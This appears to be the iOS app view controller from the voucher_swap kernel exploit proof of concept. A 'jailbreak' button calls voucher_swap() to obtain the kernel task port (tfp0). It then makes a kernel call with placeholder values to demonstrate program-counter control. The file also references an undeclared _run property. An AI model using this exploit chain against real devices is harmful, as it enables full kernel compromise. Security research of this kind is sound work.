//
//  ViewController.m
//  voucher_swap
//
//  Created by Brandon Azad on 12/7/18.
//  Copyright © 2018 Brandon Azad. All rights reserved.
//

#import "ViewController.h"
#import "voucher_swap.h"
#import "kernel_call.h"
#import "log.h"

@interface ViewController ()
@property (weak, nonatomic) IBOutlet UITextView *consoleView;

@end

@implementation ViewController

- (void)viewDidLoad {
	[super viewDidLoad];
	
}

    - (IBAction)jailbrek:(id)sender
    {
        if ([_run.titleLabel.text isEqualToString:@""])
        {
        }
        else
        {
            _run.enabled = false;
            [_run setTitleColor:[UIColor grayColor] forState:UIControlStateNormal];
            [sender setTitle:@"doing it..." forState:UIControlStateNormal];
            _consoleView.text = @"Logs:\nRunning Exploit\n(console logs still wip lol)";
            double delayInSeconds = 5.0;
            dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(delayInSeconds * NSEC_PER_SEC));
            dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
                [self heiltfp0];
            });
            
        }
    }

-(void)heiltfp0{
    mach_port_t tfp0 = voucher_swap();
    if (!MACH_PORT_VALID(tfp0)) {
        printf("Failed to get tfp0!\n");
        exit(1);
    }
    printf("We got tfp0 at: 0x%x\n",tfp0);
    bool ok = kernel_call_init();
    if (!ok) {
        exit(1);
    }
    INFO("About to panic: check the panic log to observe PC+register control");
    sleep(1);
    kernel_call_7(0xfffffff041414141, 7,
                  0x4040404040404040,
                  0x4141414141414141,
                  0x4242424242424242,
                  0x4343434343434343,
                  0x4444444444444444,
                  0x4545454545454545,
                  0x4646464646464646);
    kernel_call_deinit();
}

- (void)log:(NSString *)text {
    self.consoleView.text = [NSString stringWithFormat:@"%@%@ \n", self.consoleView.text, text];
}

@end
